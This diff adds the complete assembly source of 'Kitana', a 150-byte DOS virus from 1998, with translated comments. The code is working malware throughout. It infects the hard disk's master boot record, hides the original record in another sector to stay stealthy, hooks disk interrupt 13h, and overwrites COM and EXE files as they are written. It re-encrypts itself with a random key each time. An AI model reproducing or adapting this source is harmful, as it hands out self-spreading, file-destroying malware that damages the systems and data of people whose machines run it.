@@ -1,0 +1,154 @@
+;
+; --[Original Info]--
+; Name    : Kitana
+; Made by : FRiZER                                                  
+; Made at : 12.06.98                                                
+; Size    : 150 bytes                                               
+; Target  :                                                         
+;     COM : Overwrite when write it to disk                         
+;     EXE : Overwrite when write it to disk                         
+;     MBR : Infect when start infected file                         
+; Stealth : MBR                                                     
+; Crypted : used random key                                         
+; Comment : Can you make more functional virus with size 150 bytes ?
+;           e-mail: frizer@bbs.edisoft.ru, FIDO: 2:5040/57.27
+; --[End Original]--
+;
+;       This source was translated from russian to english by LovinGod/Stealth
+; I have gone through and edited some gramatical problems in the comments
+; however, the code itself remains the same. Some comments where added
+; by me, but most are the originals
+;                                                      - Techno Phunk -
+;
+; How To Compile:
+;
+;
+; Code follows
+.model tiny
+.386
+.code
+.startup
+vs    equ e-s
+org   100h
+; required startup registers values
+; COM : AX=0000: SI=0100: CH=00
+; MBR : BX=7C00: CH=00
+s:
+test  bx,bx             ; bx = 0 at start from com/exe
+pushf                   ; saving comparsion result
+jz m
+xchg  si,bx             ; if starting from mbr, then si = bx = 7C00h
+m:
+push  si                ; saving code starting offset
+add   si,c-s            ; si = offset of crypted code start
+mov   cl,e-c            ; cx = length of this code.
+l:
+xor   [si],byte ptr 0   ; Decryption loop.
+inc   si
+loop  l
+c:
+pop   si                ; si = code start offset
+popf                    ; restore the comparison results.
+jnz   if_mbr            ; jump if we are in the MBR.
+dec   ax                ; AX=FFFF - Installation Check
+int   13h               ; if virus is already in RAM, then it will return to PSP:0
+                        ; (to int 20h), else ax = 01FF
+mov   ax,0201h          ; Read in one sector
+mov   dx,0080h          ; From cylinder 0 of the 1st HDD
+mov   cl,al             ; CX=0001 - first sector from Zero track
+mov   bx,ax             ; read/write buffer - located after the virus' body
+int   13h
+cmp   [bx],byte ptr 85h ; and now, check if the MBR is infected
+je    _ret
+
+mov   ax,0301h          ; AX=0301
+inc   cx                ; CX=0002 write old MBR into 0/0/2
+x10:
+push  ax
+int   13h               ; ax is being damaged after int13h
+pop   ax
+xchg  si,bx             ; after the loop: CX=0001; BX=virus start
+loop  x10               ; writing virus body to 0/0/1
+
+_ret:
+ret                     ; return
+
+if_mbr:
+push  cs                ; ds=cs
+pop   ds
+
+dec   word ptr 0:[413h] ; decrease total RAM on 1 kByte
+int   12h               ; get total RAM size in kBytes
+
+mov   cl,150            ; virus length (150 bytes)
+rol   ax,cl             ; get new segment value for virus into AX
+                        ; ROL AX,150 = SHL AX,6 (AX=AX*64)
+
+mov   es,ax
+xor   di,di             ; DI=0 - offset of virus body in new segment
+
+rep   movsb             ; moving 150 bytes from ds:[si] to es:[di]
+inc   cx
+inc   cx                ; CX=0002
+
+                        ; int13h overtake:
+scasw                   ; segment must be at e+2 address [LovinGOD: hmm]
+std                     ; DirectionFlag=1 => after STOSW will be DI=DI-2
+x20:                    ; loop executes twice - first, int 13 segment
+xchg  ax,[di-(vs-4Ch)]  ; been set to virus int_handler in IVT, and
+                        ; handler's end appears as
+stosw                   ; JMP FAR xxxx:????
+mov   ax,new13h-s       ; in second, the same with offset, i.e.
+loop  x20               ; virus ends with JMP FAR xxxx:zzzz
+                        ; xxxx - segment int13h, zzzz - offset int13h
+
+int  19h                ; reboot (remembering about MBR-stealthing)
+                        ; i.e. old MBR will be read and take control
+
+new13h:                 ; int13h handler
+inc   ax                ; if ax=FFFF => then it becomes 0000
+jnz   z10
+pop   bx                ; getting return offset
+push  ax                ; pushing 0
+                        ; acceptable way for OverWriter
+iret                    ; return to PSP:0 (where int20h rests)
+z10:
+dec   ax                ; restoring primary AX value
+push  ds
+pusha
+cmp   dx,80h            ; zero HDD head asked ?
+jnz   chk_com
+loop  exit13h           ; if not asking for 0/0/1 -> exit13h
+popa                    ; MBR-Stealth
+inc   cx                ; if 0/0/1 requested, then substitute with 0/0/2
+jmp   exit13h+1         ; отдаем управление с CX=0002
+
+chk_com:
+mov   al,es:[bx]        ; AX=xxzz; if xx=03 (write function)
+sub   ax,34Dh           ; and zz=4Dh => writing sector, containing 'M' at the beginning
+jz    cc10              ; if yes, write sector
+sub   al,0E9h-'M'       ; if not 'M' then maybe 'щ' (JMP near) ?
+jnz   exit13h           ; no ? so what...
+cc10:
+xchg  ax,si             ; si=0000
+xchg  bx,di             ; di=where the virus body to store (into a buffer)
+push  cs
+pop   ds                ; setting ds to the virus body seg.
+
+in    al,40h            ; al = randomize (crypt key)
+mov   [si+l+2-s],al     ; change key value in the decryptor
+mov   cx,c-s            ; cx = decryptor length
+rep   movsb
+xchg  ah,al             ; ah = crypt key
+mov   cl,e-c            ; cx = length of encrypted code
+l2:
+lodsb
+xor   al,ah             ; encrypt
+stosb
+loop  l2
+exit13h:
+popa                    ; restore all registers
+pop   ds                ; restore ds
+db    0EAh              ; jmp xxxx:xxxx
+e:
+end
